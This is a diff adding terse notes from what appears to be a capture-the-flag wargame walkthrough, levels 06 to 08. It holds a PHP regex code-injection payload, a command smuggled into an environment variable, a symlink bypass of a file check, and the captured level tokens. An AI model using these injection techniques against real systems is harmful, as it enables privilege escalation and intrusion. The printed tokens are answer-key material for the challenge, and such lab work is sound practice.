@@ -96,6 +96,43 @@ viuaaale9huek52boumoomioc
 
 level06
 
+cat /tmp/input.txt
+[x {${system(getflag)}}]
 
+./level06 /tmp/input.txt
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+flag = wiok45aaoguiboiki2tuin6ub
+
+su level07
+wiok45aaoguiboiki2tuin6ub
+
+level07
+
+export LOGNAME=";getflag"
+
+./level07 
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+su level08
+fiumuikeil55xe9cu4dood66h
+
+level08
+
+ln -s /home/user/level08/token /tmp/yes
+
+./level08 /tmp/yes
+quif5eloekouj29ke0vouxean
+
+su flag08
+quif5eloekouj29ke0vouxean
+
+getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+su level09
 
 
